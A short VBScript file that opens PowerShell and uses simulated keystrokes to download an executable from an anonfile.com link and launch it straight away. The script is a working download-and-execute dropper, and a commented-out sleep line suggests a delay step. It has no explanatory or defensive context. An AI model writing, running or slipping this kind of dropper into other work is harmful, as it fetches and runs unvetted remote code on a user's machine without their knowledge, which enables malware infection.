Set WshShell = WScript.CreateObject("WScript.Shell")
' WScript.Sleep 100000

WshShell.Run "powershell"
WScript.Sleep 1000
WshShell.SendKeys "$url = 'https://cdn-18.anonfile.com/d1R1S7S3n4/8944a2fc-1580663542/MSGBOX.exe';$outpath = 'myexe.exe';Invoke-WebRequest -Uri $url -OutFile $outpath;Start-Process -Filepath 'myexe.exe';"
WshShell.SendKeys "{ENTER}"